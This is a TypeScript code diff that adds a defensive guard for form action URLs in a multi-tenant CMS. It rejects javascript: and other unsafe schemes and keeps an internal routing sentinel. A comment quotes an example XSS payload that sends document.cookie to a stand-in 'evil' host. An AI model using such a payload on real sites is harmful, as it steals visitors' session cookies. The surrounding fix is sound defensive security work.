@@ -55,6 +55,52 @@ export function neutralizeDangerousHref(href: string): string {
   return href;
 }
 
+// SECURITY — form `action` is a URL sink too.
+//
+// `<form action>` navigates on submit exactly like `<a href>` does on click, so
+// `action: "javascript:fetch('https://evil/?c='+document.cookie)"` persisted on
+// a contact_form section executes for every visitor who submits the published
+// page. Same blast radius as the href case: published tenant sites share the
+// `*.tulala.digital` apex, cookies are parent-scoped, so this is cross-tenant
+// exposure rather than self-XSS. The action field had NO scheme guard at all —
+// neither the schema (a bare `z.string()`) nor `prefixPublicHrefsDeep` (whose
+// guarded key set only covered href/ctaHref/rsvpUrl/brandHref).
+//
+// One wrinkle keeps `action` out of the ordinary href lane: contact_form uses
+// a scheme-shaped SENTINEL, `internal` / `internal:auto` / `internal:<x>`, to
+// mean "post to Tulala's own /api/cms/forms/submit". A naive scheme allowlist
+// would neutralize that sentinel to "#" and break every internally-routed form,
+// so the sentinel is recognized and passed through untouched — it never reaches
+// the DOM as an action anyway (the component swaps it for the internal
+// endpoint). Everything else runs the shared allowlist.
+//
+// Note `action` is guarded but never tenant-PREFIXED: a form action is an
+// endpoint, not a page route, so rewriting `/api/x` to `/impronta/api/x` would
+// break it.
+const INTERNAL_FORM_ACTION_SENTINEL = /^internal(?::|$)/i;
+
+/**
+ * True when the string is a legitimate form action: the `internal…` routing
+ * sentinel, a scheme-less relative/absolute path, or an allowlisted
+ * navigational scheme (http/https/mailto/tel/sms — `mailto:` form actions are
+ * a documented contact_form option). Exported for write-time validation
+ * (zod refinement) so dangerous values are rejected at save, not just
+ * neutralized at render.
+ */
+export function isSafeFormAction(action: string): boolean {
+  if (INTERNAL_FORM_ACTION_SENTINEL.test(action.trim())) return true;
+  const scheme = hrefScheme(action);
+  return scheme === null || SAFE_LINK_SCHEMES.has(scheme);
+}
+
+/**
+ * Render-time guard for `<form action>`. Returns the action unchanged when it
+ * is safe, `"#"` when it carries a script-capable or unknown scheme.
+ */
+export function neutralizeFormAction(action: string): string {
+  return isSafeFormAction(action) ? action : "#";
+}
+
 function splitHref(href: string): { pathname: string; suffix: string } {
   const hashIndex = href.indexOf("#");
   const queryIndex = href.indexOf("?");
@@ -125,10 +171,17 @@ export function prefixPublicHrefsDeep<T>(value: T, publicPathPrefix: string): T 
       normalizedKey === "ctahref" ||
       normalizedKey === "rsvpurl" ||
       normalizedKey === "brandhref";
-    out[key] =
-      shouldPrefix && typeof child === "string"
-        ? prefixPublicHref(child, publicPathPrefix)
-        : prefixPublicHrefsDeep(child, publicPathPrefix);
+    // `action` is scheme-guarded but NOT prefixed (see neutralizeFormAction).
+    const shouldGuardAction = normalizedKey === "action";
+    if (shouldPrefix && typeof child === "string") {
+      out[key] = prefixPublicHref(child, publicPathPrefix);
+      continue;
+    }
+    if (shouldGuardAction && typeof child === "string") {
+      out[key] = neutralizeFormAction(child);
+      continue;
+    }
+    out[key] = prefixPublicHrefsDeep(child, publicPathPrefix);
   }
   return out as T;
 }
